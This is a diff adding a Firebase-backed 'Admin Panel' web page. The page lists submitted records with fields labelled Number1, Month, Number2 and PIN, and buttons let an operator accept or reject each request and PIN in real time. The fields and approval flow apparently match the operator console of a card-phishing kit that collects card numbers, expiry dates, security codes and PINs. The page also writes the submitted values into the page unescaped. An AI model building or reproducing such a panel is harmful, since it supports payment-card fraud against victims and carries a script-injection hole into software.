@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<title>Admin Panel</title>
+
+<style>
+
+body{
+    font-family:Arial;
+    background:#111;
+    color:white;
+    padding:30px;
+}
+
+.card{
+    background:#1b1b1b;
+    padding:20px;
+    border-radius:15px;
+    margin-bottom:20px;
+}
+
+button{
+    padding:10px 16px;
+    margin-right:10px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+}
+
+.accept{
+    background:#00c853;
+    color:white;
+}
+
+.reject{
+    background:#ff1744;
+    color:white;
+}
+
+</style>
+
+</head>
+<body>
+
+<h1>Admin Panel</h1>
+
+<div id="data"></div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+getFirestore,
+collection,
+onSnapshot,
+doc,
+updateDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyC5YbZhR6rgKB3P5b7NFJLc0v9XTfV13fY",
+  authDomain: "live-project-b8670.firebaseapp.com",
+  projectId: "live-project-b8670",
+  storageBucket: "live-project-b8670.firebasestorage.app",
+  messagingSenderId: "697940186812",
+  appId: "1:697940186812:web:839b1bdd9291aea6e862b9",
+  measurementId: "G-L9PNRZEV5W"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+onSnapshot(collection(db,'requests'),(snapshot)=>{
+
+    let html = '';
+
+    snapshot.forEach((docSnap)=>{
+
+        const data = docSnap.data();
+
+        html += `
+
+        <div class="card">
+
+        <h3>ID: ${docSnap.id}</h3>
+
+        <p>Number1: ${data.number1}</p>
+        <p>Month: ${data.dateValue}</p>
+        <p>Number2: ${data.number2}</p>
+
+        <p>Status: ${data.status}</p>
+
+        `;
+
+        if(data.status === 'pending'){
+
+            html += `
+
+            <button class="accept"
+            onclick="approve('${docSnap.id}')">
+            Accept
+            </button>
+
+            <button class="reject"
+            onclick="rejectReq('${docSnap.id}')">
+            Reject
+            </button>
+
+            `;
+
+        }
+
+        if(data.pin){
+
+            html += `
+
+            <hr>
+
+            <p>PIN: ${data.pin}</p>
+            <p>PIN Status: ${data.pinStatus}</p>
+
+            `;
+
+        }
+
+        if(data.pinStatus === 'pending'){
+
+            html += `
+
+            <button class="accept"
+            onclick="approvePin('${docSnap.id}')">
+            Accept PIN
+            </button>
+
+            <button class="reject"
+            onclick="rejectPin('${docSnap.id}')">
+            Reject PIN
+            </button>
+
+            `;
+
+        }
+
+        html += `</div>`;
+
+    });
+
+    document.getElementById('data').innerHTML = html;
+
+});
+
+
+window.approve = async(id)=>{
+
+    await updateDoc(doc(db,'requests',id),{
+        status:'accepted'
+    });
+
+}
+
+window.rejectReq = async(id)=>{
+
+    await updateDoc(doc(db,'requests',id),{
+        status:'rejected'
+    });
+
+}
+
+window.approvePin = async(id)=>{
+
+    await updateDoc(doc(db,'requests',id),{
+        pinStatus:'accepted'
+    });
+
+}
+
+window.rejectPin = async(id)=>{
+
+    await updateDoc(doc(db,'requests',id),{
+        pinStatus:'rejected'
+    });
+
+}
+
+</script>
+
+</body>
+</html>
